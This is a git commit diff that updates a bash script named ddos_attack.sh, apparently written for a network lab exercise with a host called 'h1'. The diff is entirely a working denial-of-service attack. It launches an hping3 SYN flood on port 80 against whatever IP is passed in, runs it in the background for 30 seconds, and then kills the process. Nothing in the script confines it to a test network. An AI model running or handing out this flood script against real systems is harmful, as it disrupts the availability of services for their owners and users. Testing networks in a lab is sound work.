83b280e36c559273f49825c2b640de96fd418221
Shakeel Mohamed <mmmshakeel@gmail.com>
2024-07-24 19:44:08 +0200

    Update ddos script to run for a given time and stop

--- ddos_attack.sh
+++ ddos_attack.sh
@@ -1,7 +1,19 @@
 #!/bin/bash
 
-# Target IP
+# Target IP address (h1 in this example)
 TARGET_IP=$1
 
-# Run the DDoS attack
-hping3 -S --flood -V $TARGET_IP
+# Duration of the attack in seconds
+DURATION=30
+
+# Run the DDoS attack using hping3
+echo "Starting DDoS attack on $TARGET_IP for $DURATION seconds..."
+hping3 -S --flood -V -p 80 $TARGET_IP &
+HPING3_PID=$!
+
+# Sleep for the duration of the attack
+sleep $DURATION
+
+# Stop the attack
+kill $HPING3_PID
+echo "DDoS attack stopped."
